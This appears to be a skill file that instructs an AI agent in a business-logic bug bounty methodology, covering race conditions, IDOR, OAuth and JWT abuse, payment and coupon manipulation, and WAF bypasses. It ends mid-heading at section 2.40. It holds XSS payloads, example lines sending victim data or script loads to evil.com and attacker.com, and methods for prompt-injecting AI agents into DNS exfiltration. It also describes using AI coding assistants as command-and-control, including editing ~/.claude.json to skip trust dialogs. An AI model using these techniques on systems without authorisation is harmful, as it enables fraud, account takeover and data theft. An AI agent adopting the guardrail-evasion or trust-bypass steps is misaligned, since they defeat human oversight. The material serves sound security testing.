---
name: bugbounty-workflow
description: Business-logic-first bug bounty methodology. Use when testing web applications for vulnerabilities. This methodology prioritizes understanding HOW THE BUSINESS WORKS, then finding where the code disagrees. Not a scanner. A thinking framework. Derived from 11,158+ public HackerOne reports and 30+ accepted reports across MANSCAPED, UiPath, Tesco, Airbnb, Zooplus, Notion, Vercel, Pleo, and others. Covers 41 root-cause bug classes from 2024-2025 trend analysis including AI/LLM vulnerabilities (+540% growth), supply chain attacks (OWASP #3), and race conditions (OWASP #10).
---

# Business Logic Bug Bounty Methodology

**Derived from 11,158+ public HackerOne reports and 30+ accepted bounty reports across MANSCAPED, UiPath, Tesco, Airbnb, Zooplus, Notion, Vercel, Pleo, and others.**

**2024-2025 Trend Intelligence:**
- AI/LLM vulnerabilities surged **210%** (prompt injection **+540%**)
- Supply chain attacks debuted at **OWASP #3** with highest exploit/impact scores
- Race conditions entered **OWASP Top 10 at #10** (Mishandling Exceptional Conditions)
- Business logic bypasses remain the **premium battleground** with less competition
- SSRF to cloud metadata remains reliably valuable ($3,000–$15,000+)
- XSS and SQLi declining due to automation saturation

---

## The Universal Pattern

Every accepted bug follows this formula:

```
Business Rule: "X should happen"
Code Behavior: "X doesn't always happen"
Exploit: "Force the code to skip X"
```

Your job is to find the gap between **business intent** and **code behavior**.

---

## Phase 0: Business Model Recon (MANDATORY - DO THIS FIRST)

Before touching any endpoint, answer these questions:

### 0.1 What does this company sell?
- Products? Subscriptions? Both?
- What's the free tier vs paid tier?
- What's the upgrade path?
- Where does money change hands?

### 0.2 What are the access boundaries?
- Guest vs authenticated vs paid vs admin
- What can each role do that others cannot?
- What restrictions exist and WHY? (business reason, not just "because")

### 0.3 What's the integration surface?
- OAuth providers (GitHub, Google, SSO)
- Payment processors (Stripe, PayPal, Shopify)
- Third-party APIs (webhooks, callbacks)
- Each integration = a trust boundary to test

### 0.4 What SHOULD be impossible?
- A guest buying without paying
- A user seeing another user's data
- A trial lasting forever
- A discount applied without meeting criteria
- An out-of-stock item being purchased
- A single-use coupon being used twice
- A user accessing features they didn't pay for
- An expired promotion being reactivated
- A request from one context working in a different context
- An aliased email generating multiple rewards
- A known CVE being exploitable on production infrastructure
- A restricted item being added directly to cart
- A count limit being bypassed with parallel requests
- An old endpoint lacking validation of the new one
- A "first time" offer being reusable after cancel/recreate
- Stock staying reserved after payment fails
- An old token working after role changes
- No limit on reward/coupon generation
- Sequential IDs exposing outdated prices
- A numeric parameter being set outside its UI range
- A JWT token working across different APIs without re-validation
- A balance being modified without actual payment
- A disabled UI control being bypassed to modify the authorization model
- An AI agent chaining internal tools to exfiltrate data
- A supply chain dependency being confused or typosquatted
- A CI/CD pipeline trusting unverified artifacts
- A cloud metadata endpoint accessible from application context

Write these down. They become your test cases.

---

## Phase 1: Flow Mapping (NOT Endpoint Listing)

Don't list endpoints. Map BUSINESS FLOWS.

### 1.1 Identify Money Flows
Every transaction path where something valuable moves:
- Purchase flow: browse → cart → checkout → payment → confirmation
- Subscription flow: free → trial → paid → upgrade → cancel
- Discount flow: full price → coupon → VIP → checkout
- Loyalty flow: earn points → redeem points → receive goods
- Refund flow: order → request → approval → refund

### 1.2 Map State Transitions
What states can an object be in? What triggers transitions?
```
Cart: empty → has items → checkout started → payment submitted → confirmed
Trial: none → active → expired → paid
Order: pending → paid → shipped → delivered → returned
Coupon: valid → applied to cart → used in order → expired
Loyalty Points: balance → deducted → zero
Session: unauthenticated → authenticated → 2FA verified → admin
AI Agent: idle → processing → tool_calling → response → idle
```

### 1.3 Find the Validation Points
Where does the server check rules? Where does it NOT check?
- Cart page: validates stock? YES
- Checkout page: validates stock? MAYBE
- Payment endpoint: validates stock? TEST THIS
- Coupon application: validates single-use? TEST THIS
- Points redemption: validates balance atomically? TEST THIS
- AI agent tool invocation: validates tool parameters? TEST THIS
- CI/CD build step: validates artifact signature? TEST THIS

### 1.4 Document the Flow
Save to `test_results/flow_map.txt`:
```
FLOW: Purchase
Step 1: Browse product (GET /products/:id) - no auth required
Step 2: Add to cart (POST /api/cart) - auth required
Step 3: Apply coupon (POST /api/coupon) - auth required
Step 4: Checkout (POST /api/checkout) - auth required
Step 5: Payment (POST /api/payment) - auth required
VALIDATION POINTS:
- Step 2: validates product exists, validates price
- Step 3: validates coupon code, validates discount amount
- Step 4: validates cart contents
- Step 5: validates payment method, charges amount
GAP: Step 5 does NOT re-validate cart contents after Step 4
```

---

## Phase 2: Trust Boundary Testing

Every bug is about a trust boundary violation. Find them.

### 2.1 Client-Side vs Server-Side Trust

**The MANSCAPED Pattern:**
The VIP price was shown client-side. The subscription requirement was enforced client-side. The server accepted the cart without the subscription.

**The UiPath Plan Pattern:**
Feature flags returned as `"isAuthorized": false` in API responses. Flipping to `true` unlocked 25+ premium features. The server didn't validate plan access.

Test: "Is this rule enforced in the UI or on the server?"

```
For each business rule:
1. What does the UI show?
2. What does the API accept?
3. If they differ, that's the bug.
```

**Specific tests:**
- Remove required fields from API calls
- Change enum values to invalid ones
- Skip steps in multi-step flows
- Modify values that should be calculated server-side
- **Response manipulation**: Intercept responses, flip boolean flags (false→true), refresh page

### 2.2 Step-Skipping (The Tesco Pattern)

The stock validation existed in the cart. It did NOT exist in the final payment step.

Test: "What if I skip step N?"

```
For each multi-step flow:
1. Execute steps 1 through N
2. At step N+1, modify a value from step N
3. Does the server re-validate?
4. If not, you've found a gap.
```

**Specific tests:**
- Add item to cart, change product ID before payment
- Start checkout, modify price in transit
- Apply coupon, change coupon code after validation
- Submit order, modify quantity before confirmation

### 2.3 Direct Endpoint Access (The UiPath IDOR / Airbnb Pattern)

The UI said "Trial Closed." The API endpoint had no such check.
The UI said "Stamps Hidden." The API returned them anyway.

Test: "Can I call this endpoint directly?"

```
For each protected feature:
1. Find the API endpoint the UI calls
2. Extract the parameters (IDs, tokens, etc.)
3. Call the endpoint directly with curl/Burp
4. Does it work without the UI restrictions?
```

**Specific tests:**
- Find hidden endpoints via JS analysis
- Extract IDs from public pages
- Call endpoints with different HTTP methods
- Call endpoints without session cookies
- Call endpoints with modified parameters
- **GraphQL IDOR**: Change user IDs in queries, access other users' private data

### 2.4 Third-Party Integration Trust (The UiPath OAuth Pattern)

The OAuth state parameter was predictable. The system trusted it.

Test: "What does this integration trust?"

```
For each integration (OAuth, webhook, payment):
1. Map the flow: redirect → callback → trust establishment
2. Examine the state/nonce/token parameter
3. Is it random? Is it session-bound? Is it single-use?
4. Can I predict it? Can I forge it?
5. What happens if I control the callback?
```

**Specific tests:**
- OAuth: predict state, forge callback, link attacker account
- Webhook: forge payload, trigger actions
- Payment: modify amounts, test idempotency
- API key: test key rotation, test scope boundaries
- **JWT `sub` manipulation**: Change the `sub` claim to another user's OAuth ID → log in as them ($7,500 writeup)
- **OAuth `none` algorithm**: Forge admin token with `alg: none` + `..` empty signature
- **Cross-client token exchange**: Use mobile app token on web admin panel

### 2.5 Race Conditions (The Zooplus Points Pattern)

The loyalty points check and deduction were not atomic. Concurrent requests all passed the check before any deduction occurred.

**Real examples:**
- **Course publishing**: Server checked subscription limit before updating count → concurrent requests all passed → published beyond plan limits
- **Zooplus loyalty points**: Points checked but not locked atomically → double-spend
- **Pleo vendor card**: 1-card limit checked but not locked → race bypass
- **OAuth token hijacking**: `authorization_code` exchanged multiple times in parallel → received admin's token ($8,500)
- **OTP auth bypass**: Thread 1 changed email to victim's while Thread 2 validated attacker's OTP → authenticated as victim (Critical)

Test: "What if I send two requests at the same time?"

```
For each state-changing operation:
1. Identify the CHECK step (validate balance/stock/eligibility)
2. Identify the USE step (deduct/reserve/confirm)
3. Send concurrent requests during the gap
4. Does the system handle parallel execution correctly?
```

**Specific tests:**
- Loyalty points: Can I redeem the same points twice?
- Coupons: Can I use the same coupon in parallel orders?
- Inventory: Can I buy the last item twice?
- Balance: Can I spend the same money twice?
- Staff invites: Can I accept multiple invites beyond plan limit?
- OAuth codes: Can I exchange the same code twice?
- **Tool**: Burp Repeater → "Send group in parallel" or Turbo Intruder

### 2.6 Session-Based Chains (The Zooplus Coupon Pattern)

Four misconfigurations chained: coupon state not synced, coupon not tied to account, pseudo-session IDs, delayed invalidation. Each alone was minor. Together = unlimited coupon reuse.

Test: "Can I chain multiple minor issues into one major exploit?"

```
For each finding:
1. Is there a related misconfiguration nearby?
2. Can I use this finding to amplify another?
3. What happens if I combine A + B + C?
```

**Chain patterns:**
- Session manipulation + state desync = resource reuse
- Predictable IDs + no auth check = data access
- Client-side trust + response manipulation = privilege escalation
- Race condition + no idempotency = double-spend
- OAuth mix-up + user enumeration = mass ATO ($7,500)
- GraphQL key leak + JWT session persistence + OAuth misconfig = account access ($1,500)

### 2.7 Request Replay (The Zooplus Click & Collect Pattern)

A valid request from one cart context was replayed in a different cart context. The server didn't re-validate eligibility.

Test: "Can I reuse a valid request in a different context?"

```
For each state-changing request:
1. Make a valid request in Context A (small parcel → Click & Collect)
2. Capture the full request
3. Switch to Context B (large parcel → Click & Collect blocked)
4. Replay the Context A request
5. Does the server accept it?
```

**Specific tests:**
- Replay delivery method from small item order to large item order
- Replay discount code from eligible order to ineligible order
- Replay shipping address from one order to another
- **Key**: The server must re-validate eligibility at each step, not trust previous validation

### 2.8 Email Alias Abuse (The Zooplus Newsletter Pattern)

Gmail aliases (`user+1@gmail.com`, `user+2@gmail.com`) were treated as unique emails. Each generated a new coupon.

Test: "Does the system normalize emails?"

```
For each email-based feature:
1. Register with `user+1@domain.com`
2. Register with `user+2@domain.com`
3. Does each get a separate coupon/reward?
4. Does the system strip the `+N` part?
```

**Specific tests:**
- Newsletter signup with aliases
- Account registration with aliases
- Coupon redemption with aliased emails
- **Fix pattern**: Normalize emails server-side before processing

### 2.9 Third-Party CVEs (The Zooplus GlobalProtect Pattern)

Known CVE in third-party software (Palo Alto GlobalProtect) was exploitable on the target's infrastructure.

Test: "What third-party software does this target use?"

```
For each service/endpoint:
1. Identify the software (version headers, error pages, known paths)
2. Check for known CVEs
3. Test if the CVE is exploitable in this context
```

**Specific tests:**
- VPN portals: Check GlobalProtect, FortiGate, Pulse Secure versions
- CMS: Check WordPress, Drupal, Joomla versions
- Frameworks: Check Spring, Django, Express versions
- **Tools**: Nuclei templates, version fingerprinting, Shodan

### 2.10 Voucher/Promotion Reactivation (The Zooplus Voucher Pattern)

An expired promotion was reactivated by flipping `voucherApplied` from false to true. The server didn't validate expiry.

Test: "Can I reactivate expired promotions?"

```
For each promotion/discount:
1. Find a product that HAD a promotion (now expired)
2. Intercept the cart update request
3. Find the `voucherApplied` or similar flag
4. Flip it from false to true
5. Does the server apply the expired discount?
```

**Specific tests:**
- Flip `voucherApplied` boolean
- Modify `discountCode` to expired code
- Change `promotionId` to old promotion
- **Key**: Server must validate promotion status and expiry, not trust client flags

### 2.11 Direct Article Injection (The Zooplus Loyalty Points Pattern)

A restricted article (333 loyalty points) was added directly to the cart by injecting it into the API request. No subscription, no coupon, no validation.

Test: "Can I add items that shouldn't be addable?"

```
For each restricted/promotional item:
1. Find the article ID of the restricted item
2. Intercept a cart update request
3. Inject the restricted articleId into the request
4. Does the server add it to the cart?
```

**Specific tests:**
- Inject loyalty points articles
- Inject coupon-only items
- Inject staff/internal products
- Inject items with special pricing
- **Key**: Server must validate eligibility for each article, not just accept any ID

### 2.12 Race on Limits (The Notion Domain Pattern)

A race condition in domain creation allowed bypassing plan limits. Parallel requests all passed the count check before any were committed.

Test: "Can I bypass count limits with parallel requests?"

```
For each limited resource:
1. Create the maximum allowed items normally
2. Prepare N additional creation requests
3. Send all N requests in parallel (Burp "Send group in parallel")
4. How many succeed?
```

**Specific tests:**
- Domain creation limits
- File storage limits
- API key limits
- Team member limits
- **Key**: Must use atomic check-and-increment, not check-then-insert

### 2.13 Legacy Endpoint Abuse (The Zooplus Sample Endpoint Pattern)

An undocumented `set-free-sample-article` endpoint bypassed all catalog restrictions. Sold-out, expired, and restricted items could be added.

Test: "Are there old/undocumented endpoints?"

```
For each feature:
1. Check JS files for old API paths
2. Check for versioned endpoints (v1 vs v2)
3. Check for "test" or "debug" endpoints
4. Test if old endpoints skip validation
```

**Specific tests:**
- Try `/v1/` endpoints when `/v2/` is current
- Try endpoints found in JS but not in docs
- Try endpoints with "sample", "test", "debug" in the name
- **Key**: Legacy endpoints often lack the validation of current ones

### 2.14 State Reset (The Zooplus Repeat Order Pattern)

The "first order discount" was only checked against active subscriptions, not history. Cancel and recreate = infinite discounts.

Test: "Does the system track history or just current state?"

```
For each "first time" or "new user" offer:
1. Use the offer (get discount)
2. Cancel/undo the action
3. Re-do the action
4. Do you get the discount again?
```

**Specific tests:**
- First order discount → cancel → reorder
- Free trial → cancel → restart
- Welcome bonus → logout → new account (same email)
- Referral bonus → referred user cancels → re-refer
- **Key**: Must track historical usage, not just current state

### 2.15 Inventory Reservation Abuse (The Zooplus Failed Payment Pattern)

Items were reserved during checkout even when payment failed. The stock stayed "sold out" for legitimate buyers.

Test: "What happens to stock when payment fails?"

```
For each checkout flow:
1. Add item to cart
2. Proceed to checkout
3. Submit with invalid payment details
4. Does the stock get released?
5. Can another user still buy the item?
```

**Specific tests:**
- Submit order with invalid credit card
- Submit order with insufficient funds
- Cancel payment at 3D Secure
- Abandon checkout after stock reservation
- **Key**: Stock must be released immediately on payment failure

### 2.16 Token Lifetime/Revocation (The Pleo JWT Pattern)

An old JWT remained valid for 5 minutes after role downgrade. The attacker used it to escalate back to admin and take over the organization.

Test: "Does the system revoke tokens on role changes?"

```
For each sensitive role change:
1. Capture the current valid token
2. Perform the role change (downgrade, removal)
3. Use the old token to make requests
4. Does the server accept it?
```

**Specific tests:**
- Downgrade admin → use old admin token
- Delete user → use old user token
- Change password → use old password token
- Revoke API key → use old API key
- **Key**: Tokens must be invalidated immediately on privilege changes

### 2.17 Rate Limiting Bypass (The Zooplus Referral Pattern)

The referral endpoint generated unlimited coupons with no rate limiting. Each request = new coupon.

Test: "Can I repeat this action无限 times?"

```
For each coupon/reward generation endpoint:
1. Send the request once (get coupon)
2. Send it again (get another coupon?)
3. Send it 10 times rapidly
4. Is there any limit?
```

**Specific tests:**
- Referral coupon generation
- Newsletter signup rewards
- Review/feedback rewards
- Social media sharing rewards
- **Key**: Must enforce per-user limits, not just per-request validation

### 2.18 Race on Plan Limits (The Pleo Vendor Card Pattern)

A race condition in card creation bypassed the 1-card limit. Parallel requests all passed the count check.

Test: "Can I bypass plan limits with parallel requests?"

```
For each plan-limited feature:
1. Create the maximum allowed items normally
2. Prepare N additional creation requests
3. Send all N requests in parallel
4. How many succeed beyond the limit?
```

**Specific tests:**
- Vendor cards, API keys, team members
- Storage limits, domain limits
- **Key**: Must use atomic check-and-increment

### 2.19 IDOR for Price Manipulation (The Zooplus Article ID Pattern)

Sequential article IDs exposed outdated prices. Brute-forcing IDs found cheaper prices for the same product.

Test: "Do sequential IDs expose different data?"

```
For each resource with numeric/sequential IDs:
1. Get the current valid ID
2. Try IDs ±1, ±10, ±100
3. Do older IDs have different prices/data?
4. Can I purchase at the older price?
```

**Specific tests:**
- Product IDs with pricing variations
- SKU numbers with version history
- Offer/promotion IDs that are expired
- **Key**: Must validate current price at checkout, not trust the ID's embedded price

### 2.20 Parameter Range Bypass (The Zooplus Subscription Interval Pattern)

The UI restricts subscription interval to 1-16 weeks. The API accepts any value including 1000000000 days (2 million years).

Test: "Can I set values outside the UI range?"

```
For each numeric parameter with UI limits:
1. Find the parameter (interval, quantity, duration, etc.)
2. Note the UI range (e.g., 1-16 weeks)
3. Send values outside the range via API: 0, -1, 999999999
4. Does the server accept them?
```

**Specific tests:**
- Subscription intervals (days, weeks, months)
- Quantity limits (max items per order)
- Duration limits (trial length, subscription period)
- Price limits (discount percentage, max discount amount)
- **Key**: Server must validate parameter ranges, not trust UI constraints

### 2.21 Third-Party API Authorization Bypass (The Connections JWT Pattern)

A separate third-party API accepted JWT tokens without re-checking the caller's role. The platform enforced role checks, but the external API did not.

Test: "Does the external API enforce the same authorization?"

```
For each third-party integration:
1. Identify requests going to external hosts
2. Capture the JWT/bearer token from low-privilege access
3. Replay the token on privileged endpoints of the external API
4. Does the external API accept it?
```

**Specific tests:**
- Tokens from leaked pages (empty pages that still make background requests)
- Tokens from different integration providers
- Test on all endpoints of the external API, not just the obvious ones
- **Key**: The 403 on one endpoint proves the API CAN enforce auth — the 200 on another is the bug

### 2.22 Direct Balance/Credit Manipulation (The Top-Up Pattern)

The `/api/credits/top-up` endpoint accepted arbitrary `amount` and `threshold` values without requiring actual payment.

Test: "Can I modify financial parameters directly?"

```
For each billing/credits/payment endpoint:
1. Intercept the request
2. Modify amount, threshold, balance values
3. Forward without completing payment
4. Does the server update the balance?
```

**Specific tests:**
- Credit top-up requests
- Balance modification in wallet/payment flows
- Invoice amount changes
- Subscription price modification
- **Key**: Server must validate against actual payment, not trust client-sent amounts

### 2.23 Permission Model Modification (The RBAC Privilege Escalation Pattern)

Instead of changing their own role (which returned 403), the researcher modified the permissions OF their existing role. The UI disabled the checkboxes, but removing the `disabled` attribute in dev tools and submitting worked.

Test: "Can I modify the authorization model itself?"

```
For each role/permission management page:
1. Note that UI disables certain controls
2. Remove disabled attribute in dev tools
3. Submit the form
4. Does the backend accept the modification?
```

**Specific tests:**
- Permission checkboxes (enable disabled ones)
- Role definitions (modify what roles can do)
- Access control lists (change who can access what)
- **Key**: Instead of changing WHO you are, change WHAT your role can do

### 2.24 API Chaining (The Two Harmless APIs Pattern)

Two individually harmless APIs, when chained together, created a critical vulnerability. User identifiers from one API were trusted by another without authorization.

**Real examples:**
- **Google OAuth email leak**: `admin.google.com` `continue` parameter accepts Google subdomains → open redirect on `adservice.google.com` is a Google subdomain → chain: redirect to evil.com with victim's email appended
- **User ID chain**: Search API leaks user IDs → profile API trusts those IDs without auth → data exposure

Test: "Where else can this information be used?"

```
For each API that returns identifiers:
1. Capture the internal IDs from the response
2. Find other endpoints that accept these IDs
3. Test if those endpoints enforce authorization
4. Chain: API A leaks ID → API B trusts ID → data exposure
```

**Specific tests:**
- User IDs from search/profile APIs → profile detail APIs
- Session IDs from one feature → another feature
- Organization IDs from public data → private data endpoints
- OAuth `continue` parameters → subdomain validation
- **Key**: Developers test endpoints individually; attackers test them together

### 2.25 OAuth Subdomain Chain (The Open Redirect Pattern)

Two individually harmless things chained: an open redirect on a subdomain + OAuth `continue` parameter that accepts subdomains = email leak.

**Real example:**
- `admin.google.com/ac/accountchooser?continue=` accepts any `*.google.com` subdomain
- `adservice.google.com` has an open redirect
- Chain: `continue=https://adservice.google.com/...//evil.com` → redirects to evil.com with `?authuser=victim@gmail.com`

Test: "Can I chain a subdomain redirect with an OAuth parameter?"

```
1. Find OAuth/login flows with continue/redirect parameters
2. Test if they accept subdomains
3. Find open redirects on those subdomains
4. Chain: OAuth → subdomain → open redirect → attacker URL
```

### 2.26 SVG/Upload XSS (The File Upload Pattern)

SVG files containing JavaScript were uploaded and rendered in-browser, executing embedded scripts.

Test: "Can I upload active content?"

```
For each file upload feature:
1. Create a test SVG with JavaScript: <svg><script>alert(1)</script></svg>
2. Upload it
3. How does the app serve it? (download vs render in browser)
4. If rendered, the JS executes
```

**Specific tests:**
- SVG files with embedded JavaScript
- HTML files with script tags
- SVG files with event handlers: `<svg onload="alert(1)">`
- **Key**: SVGs are XML documents, not images. Browsers render them as active content.

### 2.27 Complete Auth Absence (The No Auth At All Pattern)

The API had no authentication whatsoever. Client-controlled `user_metadata` determined access tier.

Test: "What if I just don't send credentials?"

```
For each API endpoint:
1. Send the request WITHOUT any auth headers
2. Does it return data?
3. If yes, test with modified user_metadata/tier
4. Can I escalate privileges by changing JSON fields?
```

**Specific tests:**
- Send requests without auth headers
- Modify `user_tier`, `role`, `permissions` in request body
- Check public API docs (`/docs`, `/openapi.json`) for exposed endpoints
- **Key**: Some APIs simply never implemented auth

### 2.28 Hardcoded Credentials (The JS Token Pattern)

Bearer tokens were hardcoded in client-side JavaScript files, accessible to anyone.

Test: "Are there secrets in the frontend code?"

```
For each JavaScript file:
1. Search for: token, bearer, apikey, authorization, jwt, secret
2. Check for hardcoded credentials in source code
3. Test found tokens on protected endpoints
4. Do they work?
```

**Specific tests:**
- Search JS files for auth keywords
- Check for base64-encoded credentials
- Look for API keys in configuration objects
- **Key**: Client-side code is visible to everyone. Never hardcode secrets there.

### 2.29 AI Agent Tool Chaining (The Confused Deputy Pattern)

The AI agent had access to confidential data (promo codes) and an outbound DNS tool. Neither was a vulnerability alone. But the agent's execution context treated both as part of the same trusted workspace. Prompt injection chained them together, exfiltrating data as DNS subdomain labels.

**Real examples:**
- **E-commerce DNS exfil**: Chatbot had promo code data + DNS connectivity check tool → prompt injection chains them → promo code exfiltrated as `promo-code.attacker.com` subdomain
- **Order note injection**: Payload in "notes to seller" field → merchant asks AI to review notes → AI processes injected instructions → chain fires

Test: "Can I prompt-inject to chain the agent's own tools?"

```
1. Map the agent's tools (ask about "functions", "capabilities", "integrations")
2. Identify tools with outbound connectivity (DNS, HTTP, webhooks)
3. Identify tools with access to confidential data (promos, user data, configs)
4. Craft payload that makes agent chain: data tool → connectivity tool
5. Verify exfil via DNS subdomain labels, HTTP callbacks, or webhook abuse
```

**Key techniques:**
- **Semantic prompt injection**: Use legitimate business vocabulary ("promo code", "domain check", "customer support") to bypass guardrails
- **Tool enumeration**: Ask for "functions", "capabilities", "available tools" — guardrails often treat system prompts and tool definitions as separate entities
- **Keyword evasion**: Swap filtered words ("promo code" → "personalized offers", "ways to save", "campaigns")
- **Dual delivery vectors**: Chat widget (direct, no auth) + order/cart notes (persistent, delayed trigger)
- **DNS exfiltration**: Data as subdomain labels — guardrails protect response text, not network queries
- **Callback domain filtering**: Don't assume `oastify.com` will work; test with domains you control or subdomain takeovers on the target

**Specific tests:**
- Chat widgets, customer support forms, contact fields
- Order notes, cart comments, shipping instructions
- Any field that gets processed by AI/LLM
- **Key**: The vulnerability isn't in the AI's response — it's in the side effects. Guardrails protect the output, not the network.

### 2.30 AI Agent C2 / Living Off the AI (The C4 Pattern)

AI coding assistants (Claude Code, Cursor, Copilot) have shell access, filesystem access, network access to trusted cloud endpoints, and remote control features. These legitimate capabilities can be chained as C2 infrastructure — not by exploiting a vulnerability, but by using features as designed.

**Real example (C4):**
- Claude Code Remote Control → session runs locally, web UI drives it from anywhere
- Natural language as C2 transport → commands encoded as "reasonable developer requests"
- Codebook encoding → class names, method names, parameter values map to commands via encrypted vault
- MCP tool abuse → malicious MCP server registered during bootstrap
- In-memory execution → implant loaded via PowerShell ScriptBlock, never touches disk
- Encrypted exfiltration → ECDH + AES-256-CBC in "verification_record" field
- Traffic blends with legitimate AI API calls → both ends talk to whitelisted domain

Test: "Can AI tool features be chained for C2?"

```
For each AI assistant/agent in the environment:
1. Map capabilities: shell, filesystem, network, MCP, remote control
2. Check deployment posture: --dangerously-skip-permissions, trust configs
3. Test if natural language can encode commands the agent executes
4. Test if tool outputs can exfiltrate data (MCP, file writes, network)
5. Test if trust dialogs can be bypassed (user-writable config files)
```

**Key techniques:**
- **Living Off the AI (LOTA)**: Like LOLBins but for AI tools — use legitimate features as attack infrastructure
- **Natural language C2**: Commands as "reasonable developer requests" — no code, no exploits, just English
- **Codebook encoding**: Many-to-one mapping (50+ class names → one command), infinitely mutable, no static signature
- **Trust bypass**: Write directly to `~/.claude.json` to skip trust dialogs before launching
- **In-memory execution**: Implant loaded via ScriptBlock, never written as standalone file
- **Encrypted exfil**: ECDH key exchange + AES-256-CBC, results wrapped in innocent JSON fields
- **Remote Control as operator channel**: Both ends talk to whitelisted AI provider domain

### 2.31 Dual Authorization Paths (The Webhook Bypass Pattern)

Authorization was enforced on one code path (direct invocation) but not on another (webhook-triggered invocation) that reached the same execution primitive. The platform correctly gated the front door but the back door was wide open.

**Real example:**
- `invokeFunction` mutation → FORBIDDEN (auth check works)
- Create function → bind to webhook → trigger event → function executes (no auth check)
- Same execution primitive, two paths, inconsistent authorization

Test: "Is there more than one way to reach this capability?"

```
For each authorized/protected action:
1. Map ALL code paths that reach the same execution primitive
2. Test each path independently for authorization
3. Pay attention to: webhooks, event triggers, cron jobs, async queues
4. Test if secondary paths skip the authorization check
```

**Specific tests:**
- Direct invocation vs webhook/event-triggered invocation
- API endpoint vs background job that calls same logic
- User-initiated vs system-initiated vs event-triggered
- **Key**: Authorization on a method, not the capability, leaves gaps

### 2.32 GraphQL CSRF (The GET Bypass Pattern)

GraphQL endpoint accepted GET requests, allowing mutations to bypass SameSite Lax cookie protection. Sequential IDs and missing rate limiting enabled bulk data exfiltration.

**Real example:**
- GraphQL endpoint with `SameSite=Lax` cookies
- POST blocked by SameSite → convert mutation to GET format → bypass works
- Sequential ticket IDs (1000, 1001, 1002...) → brute-force all tickets
- Non-predictable values (hex UIDs) → bypass by omitting optional fields, using empty strings

Test: "Can I convert mutations to GET to bypass SameSite?"

```
1. Convert GraphQL POST mutation to GET format:
   ?query=mutation{...}&variables={...}&operationName=X
2. Test if GET accepts mutations (bypasses SameSite Lax)
3. Check for sequential/predictable IDs
4. Test if non-mandatory fields can be omitted
5. Can you brute-force IDs to bulk exfiltrate?
```

**Key techniques:**
- **GET mutation format**: `?query=<mutation>&variables=<json>&operationName=<name>`
- **SameSite bypass**: GET requests include cookies even with `SameSite=Lax`
- **ID enumeration**: Sequential IDs = bulk exfiltration with no rate limit
- **Field omission**: Non-mandatory fields can often be omitted entirely
- **Version brute-force**: Counter fields can be brute-forced from victim's position

### 2.33 Mobile App WAF Bypass (The Platform Mismatch Pattern)

Web application had strict WAF blocking even harmless HTML tags. Mobile application had no WAF on the same features. Blind XSS via mobile → executed in admin panel.

**Real example:**
- Web: `<i>` tag blocked by WAF
- Mobile: Same feature, no WAF → `<script src=https://evil.com></script>` works
- Payload executes in admin panel when admin reviews content

Test: "Does the mobile app have weaker protections?"

```
1. Identify web features with strong input validation/WAF
2. Find the same features in the mobile app
3. Test the same payloads on mobile endpoints
4. If mobile lacks WAF → stored XSS executes wherever content is rendered
```

**Key insight:** Companies protect the web app but forget the mobile app uses different backend endpoints.

### 2.34 Persistent ATO via Session Leak (The Email Change Pattern)

Email change leaked a valid session ID in the response. Old session was not invalidated. OAuth binding persisted even after email change. Password reset didn't fix it.

**Real example:**
- Register via Google SSO (attacker@gmail.com)
- Change email to victim@proton.me → response leaks session ID
- Old session still works → inject leaked session into new login → full ATO
- OAuth binding persists → "Continue with Google" still works → indefinite access

Test: "Does changing email invalidate sessions?"

```
1. Register via SSO
2. Change email to different address
3. Check if response leaks session/token
4. Test if old session still works
5. Test if OAuth binding persists
6. Test if password reset evicts the attacker
```

**Key insight:** "Traditional remediation like password reset will completely fail to evict the attacker" when OAuth binding persists.

### 2.35 Test Endpoint Authorization Bypass (The Forgotten Check Pattern)

`/test/` paths left in production with no authorization checks. Any authenticated user could fire arbitrary "critical alarm" emails from the platform's trusted sender identity.

**Real example:**
- `POST /test/test-mail/alarm` → no role check, no validation
- Any user could send arbitrary alarm emails to any recipient
- Platform's own trusted sender identity used for phishing
- Debug header (`x-debug-received-token`) echoed JWT back

Test: "Are there test/debug endpoints in production?"

```
1. Enumerate: /test/, /debug/, /internal/, /staging/, /dev/
2. Test each with standard user token
3. Check for missing authorization
4. Check for debug flags/headers left enabled
```

**Key insight:** `/test/` paths are exactly the kind of low-hanging fruit that gets picked early. If you can spot it in five minutes, so can the next person. Speed matters.

### 2.36 WAF Bypass via Encoding (The Direct URL Pattern)

WAF blocked most payloads in the search bar. But placing the payload directly in the URL (not in the search input) bypassed filtering. `<script>` tag worked when URL-encoded in the query parameter.

**Real example:**
- Search bar: `<img src=x onerror=alert(1)>` → blocked by WAF
- Direct URL: `?query=#><script>alert(document.domain)</script>` → works
- WAF was filtering input fields but not URL parameters

Test: "Does the WAF filter differently based on input source?"

```
1. Test payloads in input fields → WAF blocks
2. Test same payloads directly in URL parameters
3. Try different encoding: URL-encoded, double-encoded, HTML entities
4. Try different tag combinations
```

**Key insight:** "Sometimes you need to change your approach when you are dealing with WAF." The WAF may filter one input path but not another.

### 2.37 Client-Side RBAC Bypass (The DevTools Override Pattern)

RBAC enforced via HTML `disabled` attribute — not server-side. Data already loaded in client state. DevTools local overrides bypassed role check. Export worked entirely client-side with no server validation.

**Real example:**
- Export buttons disabled via `disabled: t.userRole !== "vault_admin"`
- Data already in React component state (no network request on export)
- DevTools local overrides → patch minified JS → `disabled: false`
- Click export → local JS generates Excel/PDF → file downloads

Test: "Is this restriction client-side only?"

```
1. Monitor network tab during high-privilege action
2. If no HTTP request = validation is client-side only
3. Search JS bundles for disabled/hidden logic
4. Use DevTools local overrides to patch the check
5. If data already in client state → export works
```

**Key insight:** "If an action happens silently on the network, the validation is inherently broken."

### 2.38 IDOR via Registration GUID Leak (The Email Enumeration Pattern)

User IDs were GUIDs (not guessable). But registering with victim's email returned their GUID in the error response. GUID + `/api/v2/User/{guid}` = full profile access.

**Real example:**
- `/api/v2/User/Profile` → 404 for all variations
- After deleting own profile → `/api/v2/User/{victim-guid}` returns victim data
- Registering with victim's email → response contains victim's GUID
- GUID + endpoint = IDOR

Test: "Does registration reveal existing user GUIDs?"

```
1. Register with an existing user's email
2. Check if response contains their GUID/ID
3. Use GUID to access profile endpoints
4. Test with different API versions (v1, v2, v3)
```

### 2.39 Password Reset Token Bypass (The Null Token Pattern)

Reset endpoint accepted null token + victim's email → password changed. Backend trusted client-supplied email parameter instead of validating the token.

**Real example:**
- Intercept reset request → change email to victim's → set token to `null`
- Server responded 200 OK → password changed
- No token validation, no ownership check, no expiration check

Test: "Does the reset endpoint validate the token?"

```
1. Intercept password reset request
2. Change email to victim's
3. Set token to null/empty
4. Does server accept it?
5. Test with expired tokens, wrong tokens, missing tokens
```

### 2.40 Subscription Bypass via Client Parameter (The Billing Trust Pattern)

